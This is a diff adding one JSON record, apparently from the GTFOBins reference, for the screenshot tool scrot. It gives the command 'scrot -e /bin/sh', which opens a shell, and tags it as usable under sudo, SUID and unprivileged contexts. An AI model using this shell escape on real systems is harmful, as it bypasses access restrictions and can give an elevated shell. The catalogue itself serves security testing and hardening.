@@ -1,0 +1,1 @@
+{"title": "scrot", "source": "gtfobins", "source_label": "GTFOBins", "path": "scrot", "html": "<h1>scrot</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">scrot -e /bin/sh</code></pre>", "excerpt": "scrot Shell scrot -e /bin/sh", "tags": ["func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}
